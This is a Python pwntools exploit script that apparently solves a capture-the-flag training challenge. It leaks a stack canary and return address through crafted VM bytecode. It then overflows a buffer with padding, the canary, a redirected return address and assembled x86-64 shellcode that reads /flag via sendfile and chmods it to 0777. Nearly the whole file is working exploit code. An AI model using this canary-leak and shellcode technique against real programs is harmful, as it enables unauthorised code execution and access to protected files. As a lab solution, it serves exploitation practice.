"""
0x401acd

imm - 0x04
add - 0x40
stk - 0x01
stm - 0x20
ldm - 0x10
cmp - 0x02
jmp - 0x80
sys - 0x08
    open - 10
    read 02 20
        b - offset
        c - size
        a - fd
    write 04
    sleep 08
    exit 01
a = 40
b = 01
c = 08
d = 20
s = 02
i = 10
f = 04

"""

from pwn import *

p = process("/challenge/toddlerone_level8.1")

a = b'\x40\x10\x01\x20\x10\xff\x01\x10\x61\x04\x40\x10\x40\x10\x00\x01\x10\x86\x20\x40\x10'
a = b'\x04\x01\x40\x04\xff\x01\x04\x31\x08\x08\x20\x04\x04\x00\x40\x04\x86\x08\x08\x20\x20'
print("payload = ", a)
print(p.readuntil(b'yancode: '))
p.send(a)
x = p.readuntil(b'\x7f\x00\x00')
print("output = ", x)
x = x[51:]
canary = x[0:8]
print("CANARY = ", canary)
x = x[::-1]
ret = x[0:8]
# print("hook : ", ret)
ret = ret[::-1]

print("hook : ", ret)
ret = int.from_bytes(ret, 'little')
ret = ret - 0xe8
ret = ret.to_bytes(8, 'little')
print("RETURN = ", ret)
a = """	mov rax, 2	
	lea rdi, [rip + file]
	mov rsi, 0	
	syscall		
	mov rdi, 1	
	mov rsi, rax		
	mov rdx, 0		
	mov r10, 1000		
	mov rax, 40	
	syscall			
	mov rax, 90
    lea rdi, [rip + file]
    mov rsi, 0x1ff
	syscall
	mov rax, 60		
    mov rdi, 99
	syscall			
file:
	.string "/flag"
"""
context.arch = "amd64"

a = asm(a)


"""
one byte
0x7fffe127d2e0:	0x0000000000000000	0x81e85338cd897000
0x7fffe127d2f0:	0x0000000000000000	0x000073286fbb3083
0x7fffe127d300:	0x000073286fdb9620	0x00007fffe127d3e8  -f8
"""
"""
0x7fffe127d2e0:	0x0000000000000000	0x81e85338cd897000
0x7fffe127d2f0:	0x0000000000000000	0x000073286fbb3083
0x7fffe127d300:	0x000073286fdb9620	0x00007fffe127d3e8  -f8
"""

b = b'A'*9 + canary + b'B'*8 + ret + a
# b = 'a'*104
print(b)
print(hex(len(b)))
p.send(b)
print("sent")
print(p.readall())
